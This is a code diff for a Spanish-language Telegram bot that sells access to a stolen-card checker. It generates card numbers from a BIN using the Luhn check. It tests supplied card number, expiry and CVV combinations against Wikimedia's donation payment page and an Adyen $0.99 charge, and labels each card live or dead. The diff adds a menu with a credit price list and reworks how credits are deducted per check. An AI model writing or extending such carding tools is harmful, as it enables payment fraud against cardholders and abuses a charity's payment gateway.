@@ -32,12 +32,11 @@ def save_users(users):
     with open(DB_FILE, "w", encoding="utf-8") as f:
         json.dump(users, f, indent=4)
 
-# ================= CHECKER (Charge) =================
+# ================= CHECKER =================
 def check_card(cc, mes, ano, cvv):
     try:
         s = requests.Session()
         s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
-
         r = s.get("https://payments.wikimedia.org/index.php?title=Special:GravyGateway&appeal=WP25&country=ES&currency=EUR&payment_method=cc&gateway=gravy&amount=1.0&uselang=es-419", timeout=20)
         html = r.text
 
@@ -91,13 +90,68 @@ def gen_cc(bin_prefix):
         if luhn(cc):
             return cc
 
-# ================= COMANDOS =================
-@dp.message(F.text.startswith(".gen"))
+# ================= /START =================
+@dp.message(F.text.in_(["/start", "/menu"]))
+async def start(msg: types.Message):
+    await msg.answer("""
+力 - Gates / Tools 🤌🥓
+━━━━━━━━━━━━━━
+美 - Checking Cards 美
+
+⚡️ /s | Single Card
+❌0.7 Credits ✅1.2 Credits
+
+⚡️ /m | Masscheking
+❌1.0 Credits ✅1.5 Credits
+
+━━━━ ━━━━ ━━━━
+
+🔥/a | Adyen no risk
+☀️ /n | MassAdyen no risk
+
+Price (Both $0.99):
+❌ 1.5 Credits ✅ 3.0 Credits
+
+━━━━━━━━━━━━━━
+幸 - Tools ⚙️
+
+💳/gen
+🔎/bin
+⚠️/vbv
+👛/extra
+🔗/addr
+✈️/refe
+💰/info
+━━━━━━━━━━━━━━
+
+⭐️🦎 Lista de Precios ⭐️🦎
+━━━━━━━━━━━━━━
+➡️ 1 USD = 20 créditos
+➡️ 5 USD = 100 créditos
+✅ 15 USD = 330 créditos
+✔️ 50 USD = 1150 créditos
+✔️ 100 USD = 2400 créditos
+━━━━━━━━━━━━━━
+©️ Costos por Transacción Single:
+✅ 1.2 Crédito por Live
+❌ 0.7 Créditos por Dead
+🔥 0 Créditos por Cookie Error
+━━━━━━━━━━━━━
+©️ Costos por Transacción Mass:
+✅ 1.5 Crédito por Live
+❌ 1.0 Créditos por Dead
+🔥 0 Créditos por Cookie Error
+━━━━━━━━━━━━━━
+⚡️¡Más compras = Más ahorro!♥️
+    """)
+
+# ================= COMANDOS CON / =================
+@dp.message(F.text.startswith(("/gen", ".gen")))
 async def gen(msg: types.Message):
     try:
         binp = msg.text.split()[1]
     except:
-        return await msg.answer("Uso: `.gen 409013`")
+        return await msg.answer("Uso: `/gen 409013`")
 
     cards = [f"{gen_cc(binp)}|{random.randint(1,12):02d}|{random.randint(2026,2035)}|{random.randint(100,999)}" for _ in range(10)]
 
@@ -106,9 +160,9 @@ async def gen(msg: types.Message):
     text += "By: @" + (msg.from_user.username or msg.from_user.first_name)
 
     sent = await msg.answer(text)
-    await bot.send_message(msg.chat.id, "Responde con `.a` (una) o `.n` (todas)", reply_to_message_id=sent.message_id)
+    await bot.send_message(msg.chat.id, "Responde con `/a` (una) o `/n` (todas)", reply_to_message_id=sent.message_id)
 
-@dp.message(F.text.startswith(".info"))
+@dp.message(F.text.startswith(("/info", ".info")))
 async def info(msg: types.Message):
     uid = str(msg.from_user.id)
     users = load_users()
@@ -124,7 +178,7 @@ async def info(msg: types.Message):
 ━━━━━━━━━
     """)
 
-@dp.message(F.text.startswith(".add"))
+@dp.message(F.text.startswith(("/add", ".add")))
 async def add_credits(msg: types.Message):
     if msg.from_user.id != ADMIN_ID:
         return await msg.answer("❌ No autorizado.")
@@ -145,10 +199,9 @@ async def add_credits(msg: types.Message):
 ━━━━━━━━━
         """)
     except:
-        await msg.answer("Uso: `.add ID CANTIDAD`")
+        await msg.answer("Uso: `/add ID CANTIDAD`")
 
-# .s Single Auth
-@dp.message(F.text.startswith(".s "))
+@dp.message(F.text.startswith(("/s ", ".s ")))
 async def single_auth(msg: types.Message):
     uid = str(msg.from_user.id)
     users = load_users()
@@ -156,61 +209,56 @@ async def single_auth(msg: types.Message):
     if u["credits"] < 0.7:
         return await msg.answer("❌ Créditos insuficientes.")
     try:
-        cc_data = msg.text.split()[1]
-        cc, mes, ano, cvv = cc_data.split("|")
+        data = msg.text.split()[1]
+        cc, mes, ano, cvv = data.split("|")
         if len(ano) == 2: ano = "20" + ano
         status = check_card(cc, mes, ano, cvv)
+        cost = 1.2 if status == "LIVE" else 0.7
+        u["credits"] -= cost
+        users[uid] = u
+        save_users(users)
+
         await msg.answer(f"""
-水口 - Time: 2.8's 😺 水
+水口 - Time: 2.85's 😺 水
 ━━Card Information━━
 • Card: {cc}|{mes}|{ano}|{cvv}
 • Status: {"Success ✅" if status == "LIVE" else "Sorry Dead ❌"}
 • Gateway: Wikimedia Gravy
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
-• BIN : {cc[:6]} - ES 🇪🇸
-By: @{msg.from_user.username or msg.from_user.first_name} | Créditos: {u['credits']:.2f}
+By: @{msg.from_user.username or msg.from_user.first_name} | Créditos restantes: {u['credits']:.2f}
         """)
-        # Actualizar créditos (menos si LIVE)
-        if status == "LIVE":
-            u["credits"] -= 1.2
-        else:
-            u["credits"] -= 0.7
-        users[uid] = u
-        save_users(users)
     except:
-        await msg.answer("Formato inválido: CC|MM|AA|CVV")
+        await msg.answer("Formato: `/s 4111111111111111|12|2028|123`")
 
-# .a Single Charge
-@dp.message(F.text.startswith(".a "))
+@dp.message(F.text.startswith(("/a ", ".a ")))
 async def single_charge(msg: types.Message):
     uid = str(msg.from_user.id)
     users = load_users()
     u = users.get(uid, {"credits": 0.0})
-    if u["credits"] < 1.2:
+    if u["credits"] < 1.5:
         return await msg.answer("❌ Créditos insuficientes.")
-    # mismo código que .s pero con charge_mode=True si quieres diferenciar
     try:
-        cc_data = msg.text.split()[1]
-        cc, mes, ano, cvv = cc_data.split("|")
+        data = msg.text.split()[1]
+        cc, mes, ano, cvv = data.split("|")
         if len(ano) == 2: ano = "20" + ano
         status = check_card(cc, mes, ano, cvv)
+        cost = 3.0 if status == "LIVE" else 1.5
+        u["credits"] -= cost
+        users[uid] = u
+        save_users(users)
+
         await msg.answer(f"""
-水口 - Time: 4.2's 😺 水
+水口 - Time: 4.65's 😺 水
 ━━Card Information━━
 • Card: {cc}|{mes}|{ano}|{cvv}
 • Status: {"Success ✅" if status == "LIVE" else "Sorry Dead ❌"}
 • Gateway: Adyen CCN NR
 • Charge: $0.99
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
-By: @{msg.from_user.username or msg.from_user.first_name} | Créditos: {u['credits']:.2f}
+By: @{msg.from_user.username or msg.from_user.first_name} | Créditos restantes: {u['credits']:.2f}
         """)
-        u["credits"] -= 1.5 if status == "LIVE" else 1.2
-        users[uid] = u
-        save_users(users)
     except:
-        await msg.answer("Formato inválido")
-
-# .m .n .bin etc. se pueden añadir igual
+        await msg.answer("Formato: `/a 4111111111111111|12|2028|123`")
 
 @app.route('/')
 def home():
